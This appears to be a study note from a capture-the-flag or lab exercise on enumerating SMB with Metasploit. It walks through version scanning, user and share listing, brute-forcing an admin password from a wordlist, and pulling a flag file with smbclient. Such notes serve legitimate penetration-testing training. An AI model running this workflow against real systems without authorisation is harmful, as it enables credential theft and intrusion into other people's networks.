## What is SMB?

Server Message Block — a network file sharing protocol for sharing files, printers, and devices on a LAN. Runs on **TCP port 445** (modern) or port 139 (legacy/NetBIOS). On Linux, the equivalent is **SAMBA**.

## Pro Tip: Set a Global Variable

Instead of setting RHOSTS for every module, set it once globally:

```bash
setg RHOSTS <target_ip>
```

This persists across all modules in the session.

## SMB Enumeration Workflow

**Step 1 — Identify SMB version**

```bash
use auxiliary/scanner/smb/smb_version
run
# Result: Samba 4.3.11 on Ubuntu
```

**Step 2 — Enumerate users**

```bash
use auxiliary/scanner/smb/smb_enumusers
run
# Result: john, ella, aisha, shawn, emma, admin
```

**Step 3 — Enumerate shares**

```bash
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
run
# Result: public, john, aisha, emma, IPC shares listed
```

**Step 4 — Brute force a specific user**

```bash
use auxiliary/scanner/smb/smb_login
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
# Result: admin : password
```

**Step 5 — Access shares with smbclient (outside MSF)**

```bash
smbclient -L //<target_ip> -U admin    # list shares
smbclient //<target_ip>/public -U admin # connect to share
ls
get flag                                # download file
```

## Key Takeaways

|Module|Purpose|
|---|---|
|`smb_version`|Identifies SMB/Samba version and OS|
|`smb_enumusers`|Lists local user accounts via SAM RPC|
|`smb_enumshares`|Lists available shares|
|`smb_login`|Brute forces SMB credentials|
